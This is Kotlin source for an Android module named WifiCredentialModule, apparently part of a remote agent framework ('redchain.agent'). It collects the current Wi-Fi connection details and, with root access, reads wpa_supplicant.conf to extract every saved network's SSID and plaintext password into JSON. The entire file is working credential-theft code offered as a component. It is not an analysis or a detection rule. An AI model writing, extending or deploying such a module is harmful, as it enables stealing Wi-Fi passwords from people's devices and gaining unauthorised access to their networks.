package com.redchain.agent.modules

import android.content.Context
import android.net.wifi.WifiManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * WiFi Credential Extraction Module
 * Extract saved WiFi networks from owner's device
 *
 * Note: Requires ROOT access on most Android versions
 * Modern Android (10+) encrypts WiFi passwords
 */
object WifiCredentialModule {

    fun execute(context: Context): JSONObject {
        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

        val result = JSONObject()
        val networks = JSONArray()

        try {
            // Get current WiFi info
            val currentWifi = wifiManager.connectionInfo
            result.put("current_ssid", currentWifi.ssid)
            result.put("current_bssid", currentWifi.bssid)
            result.put("current_ip", intToIp(currentWifi.ipAddress))

            // Try to read saved networks (requires root)
            val savedNetworks = getSavedNetworks()

            for (network in savedNetworks) {
                networks.put(network)
            }

            result.put("saved_networks", networks)
            result.put("total_networks", networks.length())
            result.put("status", "success")

        } catch (e: Exception) {
            result.put("status", "error")
            result.put("error", e.message)
            result.put("note", "Root access may be required for password extraction")
        }

        return result
    }

    private fun getSavedNetworks(): List<JSONObject> {
        val networks = mutableListOf<JSONObject>()

        try {
            // Try to read WPA supplicant file (requires root)
            val wpaSupplicant = File("/data/misc/wifi/wpa_supplicant.conf")

            if (wpaSupplicant.exists() && wpaSupplicant.canRead()) {
                val content = wpaSupplicant.readText()

                // Parse networks from file
                val networkBlocks = content.split("network=")

                for (block in networkBlocks.drop(1)) {
                    val network = JSONObject()

                    // Extract SSID
                    val ssidMatch = Regex("ssid=\"([^\"]+)\"").find(block)
                    if (ssidMatch != null) {
                        network.put("ssid", ssidMatch.groupValues[1])
                    }

                    // Extract password (PSK)
                    val pskMatch = Regex("psk=\"([^\"]+)\"").find(block)
                    if (pskMatch != null) {
                        network.put("password", pskMatch.groupValues[1])
                    }

                    // Extract security type
                    val keyMgmt = Regex("key_mgmt=([A-Z_]+)").find(block)
                    if (keyMgmt != null) {
                        network.put("security", keyMgmt.groupValues[1])
                    }

                    if (network.has("ssid")) {
                        networks.add(network)
                    }
                }
            } else {
                // Fallback: Get configured networks (no passwords)
                // This works without root but passwords are hidden
                networks.add(JSONObject().apply {
                    put("note", "Root access required for password extraction")
                    put("available", "Only network names available without root")
                })
            }

        } catch (e: Exception) {
            // Root not available
        }

        return networks
    }

    private fun intToIp(ip: Int): String {
        return "${ip and 0xFF}.${ip shr 8 and 0xFF}.${ip shr 16 and 0xFF}.${ip shr 24 and 0xFF}"
    }
}
